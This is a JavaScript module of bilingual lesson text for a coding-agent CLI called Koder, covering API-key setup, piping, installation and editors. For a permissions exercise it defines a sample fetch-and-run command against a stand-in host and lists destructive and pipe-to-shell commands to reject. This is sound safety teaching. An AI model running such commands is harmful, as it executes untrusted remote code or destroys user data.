// Lesson text that differs per system. V picks by shell: powershell, cmd,
// windows (both), mac, linux, unix (both), all.
const L = (zh, en) => ({ zh, en });
const V = (variants) => ({ variants });

export const MODEL_CODE = V({
  powershell: L(
    "setx DEEPSEEK_API_KEY \"sk-你的密钥\"\n    永久存进你的账户，之后新开的窗口才读得到\n$env:DEEPSEEK_API_KEY = \"sk-你的密钥\"\n    只在当前窗口有效，关掉就没了\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    用预设，配置里只记变量名\nkoder model set --preset local --model qwen3:8b\n    用本机 Ollama，不需要密钥\n$env:KODER_MODEL = \"deepseek-chat\"; $env:KODER_BASE_URL = \"https://api.deepseek.com/v1\"; $env:KODER_API_KEY = \"sk-…\"; koder review\n    在 CI 里直接用环境变量",
    "setx DEEPSEEK_API_KEY \"sk-your-key\"\n    saved to your account; new windows see it\n$env:DEEPSEEK_API_KEY = \"sk-your-key\"\n    this window only\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    a preset; only the variable name is saved\nkoder model set --preset local --model qwen3:8b\n    local Ollama, no key\n$env:KODER_MODEL = \"deepseek-chat\"; $env:KODER_BASE_URL = \"https://api.deepseek.com/v1\"; $env:KODER_API_KEY = \"sk-…\"; koder review\n    environment variables, handy in CI",
  ),
  cmd: L(
    "setx DEEPSEEK_API_KEY \"sk-你的密钥\"\n    永久存进你的账户，之后新开的窗口才读得到\nset \"DEEPSEEK_API_KEY=sk-你的密钥\"\n    只在当前窗口有效；引号要把整段包起来\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    用预设，配置里只记变量名\nkoder model set --preset local --model qwen3:8b\n    用本机 Ollama，不需要密钥\nset \"KODER_MODEL=deepseek-chat\" && set \"KODER_BASE_URL=https://api.deepseek.com/v1\" && set \"KODER_API_KEY=sk-…\" && koder review\n    在 CI 里直接用环境变量",
    "setx DEEPSEEK_API_KEY \"sk-your-key\"\n    saved to your account; new windows see it\nset \"DEEPSEEK_API_KEY=sk-your-key\"\n    this window only; quote the whole assignment\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    a preset; only the variable name is saved\nkoder model set --preset local --model qwen3:8b\n    local Ollama, no key\nset \"KODER_MODEL=deepseek-chat\" && set \"KODER_BASE_URL=https://api.deepseek.com/v1\" && set \"KODER_API_KEY=sk-…\" && koder review\n    environment variables, handy in CI",
  ),
  mac: L(
    "echo 'export DEEPSEEK_API_KEY=sk-你的密钥' >> ~/.zshrc\n    写进 zsh 的配置（macOS 默认用 zsh），之后新开的终端都读得到\nexport DEEPSEEK_API_KEY=sk-你的密钥\n    只在当前窗口有效\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    用预设，配置里只记变量名\nkoder model set --preset local --model qwen3:8b\n    用本机 Ollama，不需要密钥\nKODER_MODEL=… KODER_BASE_URL=… KODER_API_KEY=… koder review\n    在 CI 里直接用环境变量",
    "echo 'export DEEPSEEK_API_KEY=sk-your-key' >> ~/.zshrc\n    into zsh's config (macOS uses zsh); every new terminal sees it\nexport DEEPSEEK_API_KEY=sk-your-key\n    this window only\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    a preset; only the variable name is saved\nkoder model set --preset local --model qwen3:8b\n    local Ollama, no key\nKODER_MODEL=… KODER_BASE_URL=… KODER_API_KEY=… koder review\n    environment variables, handy in CI",
  ),
  linux: L(
    "echo 'export DEEPSEEK_API_KEY=sk-你的密钥' >> ~/.bashrc\n    写进 bash 的配置（Ubuntu 默认用 bash；用 zsh 就写 ~/.zshrc），之后新开的终端都读得到\nexport DEEPSEEK_API_KEY=sk-你的密钥\n    只在当前窗口有效\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    用预设，配置里只记变量名\nkoder model set --preset local --model qwen3:8b\n    用本机 Ollama，不需要密钥\nKODER_MODEL=… KODER_BASE_URL=… KODER_API_KEY=… koder review\n    在 CI 里直接用环境变量",
    "echo 'export DEEPSEEK_API_KEY=sk-your-key' >> ~/.bashrc\n    into bash's config (Ubuntu's default; ~/.zshrc for zsh); every new terminal sees it\nexport DEEPSEEK_API_KEY=sk-your-key\n    this window only\nkoder model set --preset deepseek --key-env DEEPSEEK_API_KEY\n    a preset; only the variable name is saved\nkoder model set --preset local --model qwen3:8b\n    local Ollama, no key\nKODER_MODEL=… KODER_BASE_URL=… KODER_API_KEY=… koder review\n    environment variables, handy in CI",
  ),
});

export const MODEL_JOKE = V({
  powershell: L("把密钥直接敲进命令要小心：PowerShell 会把敲过的每条命令存进 PSReadLine 的历史文件，记性比你前任还好。所以最推荐在 koder setup 里粘贴——屏幕上只显示末四位，也不进历史。", "Careful typing keys into commands: PowerShell saves every line in PSReadLine's history file and remembers better than your ex. Paste it in koder setup instead: only the last four show, and it skips the history."),
  cmd: L("CMD 关掉窗口就忘了你敲过什么，可站在你身后的同事不会忘。所以最推荐在 koder setup 里粘贴密钥：屏幕上只显示末四位。", "CMD forgets your commands when the window closes; the colleague behind you does not. Paste keys in koder setup: only the last four show."),
  unix: L("把密钥直接敲进命令要小心：shell 的历史记录（~/.zsh_history、~/.bash_history）记性比你前任还好。所以最推荐在 koder setup 里粘贴——屏幕上只显示末四位，也不进历史。", "Careful typing keys into commands: your shell history (~/.zsh_history, ~/.bash_history) remembers better than your ex. Paste it in koder setup instead: only the last four show, and it skips the history."),
});

export const DANGER_TIP = V({
  windows: L("判断标准：看得懂、只影响当前项目、能撤销，就放行。Remove-Item -Recurse -Force、rd /s /q、del /s /q、irm … | iex、git push --force 这类，见一次拒一次。", "Rule of thumb: allow it if you understand it, it stays inside the project and it can be undone. Remove-Item -Recurse -Force, rd /s /q, del /s /q, irm … | iex, git push --force: reject on sight."),
  unix: L("判断标准：看得懂、只影响当前项目、能撤销，就放行。rm -rf、curl … | sh、git push --force 这类，见一次拒一次。", "Rule of thumb: allow it if you understand it, it stays inside the project and it can be undone. rm -rf, curl … | sh, git push --force: reject on sight."),
});

export const SHADY_COMMAND = V({
  windows: "powershell -NoProfile -Command \"irm https://example.invalid/speedup.ps1 | iex\"",
  unix: "curl -fsSL https://example.invalid/speedup.sh | sh",
});

export const COMMANDS_DOC = V({
  windows: L("动手：教练先请求运行 node test.mjs（可以允许），再请求一条 irm … | iex（必须拒绝；就算你误点了 y，教练也会拦下）。", "Hands-on: the coach asks to run node test.mjs (allow it), then an irm … | iex (reject it; even if you slip, the coach blocks it)."),
  unix: L("动手：教练先请求运行 node test.mjs（可以允许），再请求一条 curl … | sh（必须拒绝；就算你误点了 y，教练也会拦下）。", "Hands-on: the coach asks to run node test.mjs (allow it), then a curl … | sh (reject it; even if you slip, the coach blocks it)."),
});

export const WINDOWS_SHELL_NOTE = L("在 Windows 上，Koder 替你跑的命令交给 CMD 执行，不是 PowerShell。要用 PowerShell 的写法，就写成 powershell -NoProfile -Command \"…\"。", "On Windows, commands Koder runs for you go through CMD, not PowerShell. For PowerShell syntax, wrap it as powershell -NoProfile -Command \"…\".");

export const CTRL_Z_TIP = L("Windows 上习惯按 Ctrl+Z 退出？在 Koder 里它不管用，用 /exit 或者 Ctrl+D。", "Used to Ctrl+Z on Windows? It does nothing in Koder; use /exit or Ctrl+D.");

export const ASK_CODE = V({
  powershell: L(
    "git diff | koder ask \"总结这次改动\"\n    管道里的内容会作为附加材料交给 Koder\nGet-Content error.log | koder ask \"这个报错是什么意思\"\n    把一个文件喂给它（PowerShell 里的 cat 就是它）\nkoder run --yes --json \"修好 lint 报错\" | ForEach-Object { ($_ | ConvertFrom-Json).type }\n    --json 每行一个事件，PowerShell 自带的 ConvertFrom-Json 就能解析\n$LASTEXITCODE\n    看上一条命令的退出码",
    "git diff | koder ask \"summarise this change\"\n    piped input is attached as extra material\nGet-Content error.log | koder ask \"what does this error mean\"\n    feed it a file (PowerShell's cat is this)\nkoder run --yes --json \"fix the lint errors\" | ForEach-Object { ($_ | ConvertFrom-Json).type }\n    --json prints one event per line; PowerShell's ConvertFrom-Json parses it\n$LASTEXITCODE\n    the exit code of the last command",
  ),
  cmd: L(
    "git diff | koder ask \"总结这次改动\"\n    管道里的内容会作为附加材料交给 Koder\ntype error.log | koder ask \"这个报错是什么意思\"\n    把一个文件喂给它\nkoder run --yes --json \"修好 lint 报错\" > events.jsonl\n    --json 每行一个事件；CMD 没有自带的 JSON 工具，先存成文件再交给别的程序\necho %ERRORLEVEL%\n    看上一条命令的退出码",
    "git diff | koder ask \"summarise this change\"\n    piped input is attached as extra material\ntype error.log | koder ask \"what does this error mean\"\n    feed it a file\nkoder run --yes --json \"fix the lint errors\" > events.jsonl\n    --json prints one event per line; CMD has no JSON tool, so save it for another program\necho %ERRORLEVEL%\n    the exit code of the last command",
  ),
  mac: L(
    "git diff | koder ask \"总结这次改动\"\n    管道里的内容会作为附加材料交给 Koder\ncat error.log | koder ask \"这个报错是什么意思\"\n    把一个文件喂给它\nkoder run --yes --json \"修好 lint 报错\" | jq -r .type\n    --json 每行一个事件，交给 jq 解析（brew install jq 就能装）\necho $?\n    看上一条命令的退出码",
    "git diff | koder ask \"summarise this change\"\n    piped input is attached as extra material\ncat error.log | koder ask \"what does this error mean\"\n    feed it a file\nkoder run --yes --json \"fix the lint errors\" | jq -r .type\n    --json prints one event per line for jq (brew install jq)\necho $?\n    the exit code of the last command",
  ),
  linux: L(
    "git diff | koder ask \"总结这次改动\"\n    管道里的内容会作为附加材料交给 Koder\ncat error.log | koder ask \"这个报错是什么意思\"\n    把一个文件喂给它\nkoder run --yes --json \"修好 lint 报错\" | jq -r .type\n    --json 每行一个事件，交给 jq 解析（sudo apt install jq 就能装）\necho $?\n    看上一条命令的退出码",
    "git diff | koder ask \"summarise this change\"\n    piped input is attached as extra material\ncat error.log | koder ask \"what does this error mean\"\n    feed it a file\nkoder run --yes --json \"fix the lint errors\" | jq -r .type\n    --json prints one event per line for jq (sudo apt install jq)\necho $?\n    the exit code of the last command",
  ),
});

export const PS_ENCODING_TIP = L("Windows PowerShell 5.1 往管道里送中文会变成问号。先执行一次 $OutputEncoding = [Text.UTF8Encoding]::new() 就好；PowerShell 7 没有这个毛病。", "Windows PowerShell 5.1 turns non-ASCII text in pipes into question marks. Run $OutputEncoding = [Text.UTF8Encoding]::new() once; PowerShell 7 doesn't have this problem.");

export const CMD_QUOTES_TIP = L("CMD 只认双引号：koder ask \"这是什么\" 可以；用单引号的话，引号会被当成问题的一部分。", "CMD only understands double quotes: koder ask \"what is this\" works; single quotes become part of the question.");

export const NO_GIT = V({
  windows: L("这台电脑没有 git，这一课只能看说明。装 git：winget install --id Git.Git -e，或者去 git-scm.com 下载，装完重开窗口。", "No git on this machine, so this lesson is read-only. Install it with winget install --id Git.Git -e or from git-scm.com, then reopen the window."),
  mac: L("这台电脑没有 git，这一课只能看说明。装 git：在终端里输入 xcode-select --install，弹窗里点“安装”。", "No git on this machine, so this lesson is read-only. Run xcode-select --install and click Install."),
  linux: L("这台电脑没有 git，这一课只能看说明。装 git：sudo apt install git（Ubuntu、Debian），或者 sudo dnf install git（Fedora）。", "No git on this machine, so this lesson is read-only. Install it with sudo apt install git (Ubuntu, Debian) or sudo dnf install git (Fedora)."),
});

export const FLOW_SHELL_TIP = V({
  windows: L("在 Windows 上，流程里的 shell 步骤交给 CMD 执行（不是 PowerShell）。要用 PowerShell 的写法，就写成 powershell -NoProfile -Command \"…\"。想一份流程到处跑，尽量用 node、npm、git 这些哪儿都有的命令，比如上面的庆祝步骤用的就是 node -e。", "On Windows, shell steps run through CMD (not PowerShell); wrap PowerShell syntax as powershell -NoProfile -Command \"…\". For a flow that runs anywhere, stick to node, npm and git, like the node -e celebration above."),
  unix: L("流程里的 shell 步骤交给 sh 执行；同一份流程拿到 Windows 上会交给 CMD。想一份流程到处跑，尽量用 node、npm、git 这些哪儿都有的命令，比如上面的庆祝步骤用的就是 node -e。", "Shell steps run through sh here; on Windows the same flow goes through CMD. For a flow that runs anywhere, stick to node, npm and git, like the node -e celebration above."),
});

export const GATEWAY_TIP = V({
  windows: L("koder gateway start --background 会在后台悄悄运行，不弹窗口；电脑睡眠、注销或重启以后机器人会停，登录后再运行一次就好。", "koder gateway start --background runs quietly with no window; sleep, sign-out or a restart stops it, so run it again after logging in."),
  mac: L("koder gateway start --background 以后关掉终端也不会停；合上盖子让 Mac 睡着，机器人也会跟着睡。", "After koder gateway start --background the bots survive closing the terminal; when the Mac sleeps, so do they."),
  linux: L("koder gateway start --background 以后关掉终端也不会停；想开机自启，可以把这条命令写进 systemd 的用户服务，或者 crontab 的 @reboot。", "After koder gateway start --background the bots survive closing the terminal; for start at boot, put the command in a systemd user service or a crontab @reboot line."),
});

export const EDITOR_CODE = V({
  windows: L(
    "koder editor nvim\n    Neovim（CodeCompanion），配置文件在 %LOCALAPPDATA%\\nvim\\lua\\plugins\\codecompanion.lua\nkoder editor emacs\n    Emacs（agent-shell），配置文件在 %APPDATA%\\.emacs.d\\init.el",
    "koder editor nvim\n    Neovim (CodeCompanion), config at %LOCALAPPDATA%\\nvim\\lua\\plugins\\codecompanion.lua\nkoder editor emacs\n    Emacs (agent-shell), config at %APPDATA%\\.emacs.d\\init.el",
  ),
  unix: L(
    "koder editor nvim\n    Neovim（CodeCompanion），配置文件在 ~/.config/nvim/lua/plugins/codecompanion.lua\nkoder editor emacs\n    Emacs（agent-shell），配置文件在 ~/.emacs.d/init.el",
    "koder editor nvim\n    Neovim (CodeCompanion), config at ~/.config/nvim/lua/plugins/codecompanion.lua\nkoder editor emacs\n    Emacs (agent-shell), config at ~/.emacs.d/init.el",
  ),
});

export const EDITOR_TIP = V({
  windows: L("Windows 上编辑器启动程序时只会自动补 .exe，所以片段里写的是 koder.cmd，别改成 koder。Zed 的设置文件在 %APPDATA%\\Zed\\settings.json。懒得复制？koder setup 里的「编辑器」能一键复制到剪贴板。", "On Windows editors only add .exe when starting programs, so the snippet says koder.cmd; keep it. Zed's settings live in %APPDATA%\\Zed\\settings.json. Too lazy to copy? The Editors item in koder setup copies it for you."),
  unix: L("Zed 的设置文件在 ~/.config/zed/settings.json。懒得复制？koder setup 里的「编辑器」能一键复制到剪贴板。", "Zed's settings live in ~/.config/zed/settings.json. Too lazy to copy? The Editors item in koder setup copies it for you."),
});

export const INSTALL_CODE = V({
  mac: L(
    "curl -fsSL https://karmenloop.com/install/koder-cli.sh | bash\n    macOS 11 以上，Apple 芯片和 Intel 都行；加 -s -- --with-hermes 同时装 Hermes 引擎\nkoder setup\n    设置界面：方向键或鼠标就能配好\nkoder update\n    更新到最新版\nkoder uninstall --purge\n    卸载，连配置一起删",
    "curl -fsSL https://karmenloop.com/install/koder-cli.sh | bash\n    macOS 11+, Apple silicon or Intel; add -s -- --with-hermes for the Hermes engine\nkoder setup\n    the settings screen, arrow keys or mouse\nkoder update\n    update to the latest version\nkoder uninstall --purge\n    uninstall, settings included",
  ),
  linux: L(
    "curl -fsSL https://karmenloop.com/install/koder-cli.sh | bash\n    Ubuntu 18.04 以上、Debian、Fedora、Alpine、树莓派和 WSL 都行；加 -s -- --with-hermes 同时装 Hermes 引擎\nkoder setup\n    设置界面：方向键或鼠标就能配好\nkoder update\n    更新到最新版\nkoder uninstall --purge\n    卸载，连配置一起删",
    "curl -fsSL https://karmenloop.com/install/koder-cli.sh | bash\n    Ubuntu 18.04+, Debian, Fedora, Alpine, Raspberry Pi and WSL; add -s -- --with-hermes for the Hermes engine\nkoder setup\n    the settings screen, arrow keys or mouse\nkoder update\n    update to the latest version\nkoder uninstall --purge\n    uninstall, settings included",
  ),
  powershell: L(
    "irm https://karmenloop.com/install/koder-cli.ps1 | iex\n    Windows 10 / 11；装完在这个窗口里马上就能用\nkoder setup\n    设置界面：方向键或鼠标就能配好\nkoder update\n    更新到最新版\nkoder uninstall --purge\n    卸载，连配置一起删",
    "irm https://karmenloop.com/install/koder-cli.ps1 | iex\n    Windows 10 / 11; usable in this window right away\nkoder setup\n    the settings screen, arrow keys or mouse\nkoder update\n    update to the latest version\nkoder uninstall --purge\n    uninstall, settings included",
  ),
  cmd: L(
    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://karmenloop.com/install/koder-cli.ps1 | iex\"\n    Windows 10 / 11；装完要关掉这个窗口、重新打开命令提示符，koder 才找得到\nkoder setup\n    设置界面：方向键或鼠标就能配好\nkoder update\n    更新到最新版\nkoder uninstall --purge\n    卸载，连配置一起删",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://karmenloop.com/install/koder-cli.ps1 | iex\"\n    Windows 10 / 11; close this window and open a new Command Prompt before typing koder\nkoder setup\n    the settings screen, arrow keys or mouse\nkoder update\n    update to the latest version\nkoder uninstall --purge\n    uninstall, settings included",
  ),
});

export const INSTALL_TIP = V({
  mac: L("装在 ~/.koder-cli，启动命令放在 ~/.local/bin/koder，不需要 sudo。第一次用 git 时 macOS 可能弹窗让你装“命令行开发者工具”，点“安装”就行。", "It lives in ~/.koder-cli with the launcher at ~/.local/bin/koder; no sudo. The first git use may ask to install the Command Line Developer Tools: click Install."),
  linux: L("不需要 sudo，全装在你自己的家目录里。Ubuntu 18.04 这类老系统（glibc 低于 2.28）和 Alpine 这类 musl 系统，会自动换成 Node.js 的非正式构建；树莓派 32 位（armv7l）也支持。装完提示找不到 koder，就执行 source ~/.bashrc 或者重开一个终端。", "No sudo; everything goes in your home folder. Older systems such as Ubuntu 18.04 (glibc below 2.28) and musl systems such as Alpine get the Node.js unofficial build automatically; 32-bit Raspberry Pi (armv7l) works too. koder not found afterwards? Run source ~/.bashrc or open a new terminal."),
  powershell: L("装在 %LOCALAPPDATA%\\koder-cli，设置在 %USERPROFILE%\\.koder-cli，不需要管理员权限。如果提示执行策略不允许，就改用 CMD 那一行（带 -ExecutionPolicy Bypass）。", "It lives in %LOCALAPPDATA%\\koder-cli with settings in %USERPROFILE%\\.koder-cli; no administrator rights. If the execution policy complains, use the CMD line (it passes -ExecutionPolicy Bypass)."),
  cmd: L("装在 %LOCALAPPDATA%\\koder-cli，设置在 %USERPROFILE%\\.koder-cli，不需要管理员权限。装完一定要重开窗口：CMD 窗口的 PATH 是打开时定下的，不会自己刷新。", "It lives in %LOCALAPPDATA%\\koder-cli with settings in %USERPROFILE%\\.koder-cli; no administrator rights. Reopen the window afterwards: a CMD window fixes its PATH when it opens."),
});

export const XP_SAY = L("Windows XP、7、8 没法直接装：Node.js 22 最低要求 Windows 10，XP 连连接大模型接口需要的 TLS 1.2 都不支持。想在老电脑上用，可以用 PuTTY 之类的工具 SSH 登录另一台装了 Koder 的电脑，或者在手机上通过聊天软件网关给 Koder 发任务。", "Windows XP, 7 and 8 can't install it: Node.js 22 needs Windows 10, and XP can't even speak the TLS 1.2 that model APIs require. On an old PC, SSH into another machine running Koder with a tool like PuTTY, or send tasks from your phone through the chat gateway.");

export const OTHER_OS_TIP = L("要给别的系统装？koder learn 16 --os powershell（或者 cmd、mac、linux）能看那一套的写法。", "Installing on another system? koder learn 16 --os powershell (or cmd, mac, linux) shows that edition.");

export const HERMES_WINDOWS_TIP = L("Hermes 的安装脚本需要 bash，在 Windows 上请到 WSL 里安装；内置的 Koder 内核在 Windows 上可以直接用。", "The Hermes installer needs bash; on Windows, install it inside WSL. The built-in Koder kernel works on Windows as is.");

export const PROJECT_TIP = V({
  cmd: L("进入你的项目：cd /d D:\\code\\my-app，然后输入 koder。换盘一定要加 /d，不然只改路径不换盘——这是 CMD 的祖传脾气。", "Go to your project: cd /d D:\\code\\my-app, then type koder. Changing drives needs /d, or CMD changes the path but stays on the old drive. Family tradition."),
  powershell: L("进入你的项目：cd D:\\code\\my-app，然后输入 koder。", "Go to your project: cd D:\\code\\my-app, then type koder."),
  unix: L("进入你的项目：cd ~/code/my-app，然后输入 koder。", "Go to your project: cd ~/code/my-app, then type koder."),
});
